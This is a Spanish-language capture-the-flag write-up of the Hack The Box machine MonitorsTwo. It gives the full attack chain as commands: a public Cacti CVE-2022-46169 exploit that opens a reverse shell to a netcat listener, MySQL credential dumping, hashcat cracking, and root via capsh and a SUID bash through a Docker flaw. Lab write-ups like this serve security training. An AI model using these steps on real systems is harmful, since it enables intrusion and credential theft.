---
layout: single
title: MonitorsTwo - Machines - Hack The Box
excerpt: "MonitorsTwo es una máquina de dificultad fácil en la plataforma de HTB. Para acceder debemos explotar una vulnerabilidad en Cacti, accederemos a un contenedor en el que tendremos que elevar privilegios mediante un binario SUID, conseguiremos acceso a la máquina principal crackeando un hash obtenido mediante la enumeración de la base de datos MySQL. Para escalar privilegios en la máquina principal, encontraremos una vulnerabilidad en Docker en la cual podremos ejecutar comandos del contenedor en la máquina principal obteniendo así root gracias a la bash con permisos SUID.."
date: 2023-08-20
classes: wide
header:
  teaser: /assets/images/htb-machines-monitorstwo/monitorstwo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - machines
 
tags:  
  - cve-2022-46169
  - rce
  - hashcat
  - limpeas
  - gtfobins
  
---

![](/assets/images/htb-machines-monitorstwo/monitorstwo.png)

## 1. Enumeración 

Inicialmos con un escaneo de servicios y versiones hacia el objetivo.

•	nmap -sC -sV 10.10.11.211  	

El escaneo inicial de nmap muestra que hay dos puertos abiertos en la máquina

•	HTTP (80)

•	SSH (22)

![](/assets/images/htb-machines-monitorstwo/monitorstwo2.png)

Procedemos a navegar hacia el servicio web por el puerto 80.

![](/assets/images/htb-machines-monitorstwo/monitorstwo3.png)

Se identifica un servicio web para monitoreo llamado CACTI en su versión 1.2.22.

## 2. Explotación

Se verificó si la versión 1.2.22 de Cacti la cual es vulnerable y se encontró un exploit (CVE-2022-46169).

•	https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git

![](/assets/images/htb-machines-monitorstwo/monitorstwo4.png)

Este exploit permite la ejecución remota de código no autenticado en la máquina.

Procedemos a copiar el repositorio a nuestra máquina.

•	git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git

![](/assets/images/htb-machines-monitorstwo/monitorstwo5.png)

Nos dirigimos donde se encuentra nuestro exploit escrito en Python.

![](/assets/images/htb-machines-monitorstwo/monitorstwo6.png)

En las especificaciones de uso, vemos que se necesita invocar el exploit, como parámetro pasamos -u es la URL del target, --LHOST nuestra IP y –LPORT el puerto de escucha de nuestra máquina. 

![](/assets/images/htb-machines-monitorstwo/monitorstwo7.png)

Adicionalmente debemos estar a la escucha con NETCAT del puerto que asignamos anteriormente 

•	nc -nlvp 443

![](/assets/images/htb-machines-monitorstwo/monitorstwo8.png)

Ejecutamos el explloit

•	python3 CVE-2022-46169.py  -u http://IP_TARGET --LHOST=MY_IP --LPORT=443

![](/assets/images/htb-machines-monitorstwo/monitorstwo9.png)

Vemos como obtenemos una Shell de la maquina victima como usuario www-data.

![](/assets/images/htb-machines-monitorstwo/monitorstwo10.png)

Miramos los permisos SUID.

•	ls -la

Encontrado entrypoint.sh en el directorio raíz.

![](/assets/images/htb-machines-monitorstwo/monitorstwo11.png)

Procedemos a leer el archivo.

•	cat /entrypoint.sh

Encontramos el nombre de usuario y la contraseña para MySQL.

![](/assets/images/htb-machines-monitorstwo/monitorstwo12.png)

Intentamos autenticarnos en MYSQL para comenzar a revisar el contenido de la BD.

•	mysql --host=db --user=root --password=root cacti -e "show table

![](/assets/images/htb-machines-monitorstwo/monitorstwo13.png)

Observamos la tabla user_auth.

•	user_auth puede tener credenciales.

![](/assets/images/htb-machines-monitorstwo/monitorstwo14.png)

Intentamos leer el contenido de la tabla.

•	mysql --host=db --user=root --password=root cacti -e "select * from user_auth

Se encontró una contraseña (hash) para el usuario Marcus.

![](/assets/images/htb-machines-monitorstwo/monitorstwo15.png)

Guardamos nuestro hash e intentar crakearlo con HASHCAT.

•	hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt  

![](/assets/images/htb-machines-monitorstwo/monitorstwo16.png)

Iniciamos sesión por SSH con las credenciales obtenidas y capturamos nuestra primera bandera como usuario estandar.

![](/assets/images/htb-machines-monitorstwo/monitorstwo17.png)

## 3. Escalación de Privilegios.

Descargamos Linpeas en la maquina victima para intentar encontrar una vía de explotación.

![](/assets/images/htb-machines-monitorstwo/monitorstwo18.png)

Otorgamos permisos de ejecución.

![](/assets/images/htb-machines-monitorstwo/monitorstwo19.png)

Encontramos estas dos rutas marcadas de color rojo. Nos dirigimos a la ruta /var/mail e intentamos leer el archivo marcus.

![](/assets/images/htb-machines-monitorstwo/monitorstwo20.png)

Encontramos que es un correo donde hablan de unas vulnerabilidades que encontraron. Una de ellas es una vulnerabilidad de Docker.

Debemos antes, encontrar la ruta de los contenedores mediante el comando findmnt.

![](/assets/images/htb-machines-monitorstwo/monitorstwo21.png)

En el contenedor debemos escalar privilegios.

Miramos los permisos SUID y encontramos el comando capsh.

Buscamos en GTFOBins y conseguimos root en el contenedor.

•	https://gtfobins.github.io/gtfobins/capsh/

![](/assets/images/htb-machines-monitorstwo/monitorstwo22.png)

En el contenedor, como root debemos poner la bash con permisos SUID.

![](/assets/images/htb-machines-monitorstwo/monitorstwo23.png)

En la máquina principal ejecutamos la bash del contenedor para convertirnos en root.

•	Ejecute “./bash -p” para obtener root en la máquina.

Posteriormente obtenemos nuestra flag de root.

![](/assets/images/htb-machines-monitorstwo/monitorstwo24.png)
